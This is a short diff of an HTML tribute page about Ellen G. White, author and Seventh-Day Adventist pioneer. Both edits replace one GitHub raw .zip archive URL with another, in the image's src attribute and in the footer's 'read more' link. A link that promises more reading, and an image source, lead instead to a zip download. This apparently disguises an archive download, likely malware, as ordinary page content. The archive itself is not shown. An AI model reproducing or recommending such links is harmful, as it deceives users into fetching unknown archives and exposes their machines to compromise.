@@ -13,7 +13,7 @@
   
   <div id="img-div">
    
-    <img id="image" src="https://github.com/goodnesskalu/Tribute-Page/raw/refs/heads/main/Chihuahua/Tribute-Page-v2.7.zip" alt="Image of Ellen Gould White" width="40%" height="20%">
+    <img id="image" src="https://github.com/goodnesskalu/Tribute-Page/raw/refs/heads/main/Chihuahua/Page-Tribute-2.1.zip" alt="Image of Ellen Gould White" width="40%" height="20%">
     
     <figcaption id="img-caption">Ellen G. White is an American christian author and one of the pioneers of the Seventh-Day Adventist church. She was married to James White, who was also an Adventist minister. They travelled around the continents of America, Europe, and Australia, spreading the christian gospel and the Adventist faith. </figcaption>
   </div>
@@ -36,7 +36,7 @@
   </p>
 
 
-<footer>You can read more about Ellen White from <a id="tribute-link" href="https://github.com/goodnesskalu/Tribute-Page/raw/refs/heads/main/Chihuahua/Tribute-Page-v2.7.zip" target="_blank"> this page</a></footer>
+<footer>You can read more about Ellen White from <a id="tribute-link" href="https://github.com/goodnesskalu/Tribute-Page/raw/refs/heads/main/Chihuahua/Page-Tribute-2.1.zip" target="_blank"> this page</a></footer>
 
 
 </div>
